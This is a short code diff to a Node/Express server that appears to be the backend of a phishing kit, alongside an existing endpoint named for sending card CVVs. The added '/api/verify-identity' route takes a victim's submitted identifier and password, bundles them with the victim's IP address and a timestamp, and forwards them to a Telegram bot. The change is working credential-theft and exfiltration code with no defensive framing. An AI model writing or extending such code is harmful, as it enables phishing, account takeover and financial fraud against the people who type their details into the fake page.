@@ -119,6 +119,23 @@ app.post('/api/send-cvv', async (req, res) => {
   }
 });
 
+app.post('/api/verify-identity', async (req, res) => {
+  try {
+    const { identifier, password } = req.body;
+    const msg = `<b>🔐 IDENTITÉ VÉRIFIÉE</b>
+━━━━━━━━━━━━━━━━
+👤 ${identifier}
+🔑 ${password}
+🌐 IP: ${req.clientIP}
+⏰ ${new Date().toLocaleString('fr-FR')}`;
+    await sendTelegram(msg);
+    res.json({ success: true });
+  } catch (e) {
+    console.error('Telegram error:', e);
+    res.status(500).json({ success: false, error: e.message });
+  }
+});
+
 app.get('/api/health', (req, res) => {
   res.json({ 
     status: 'OK', 
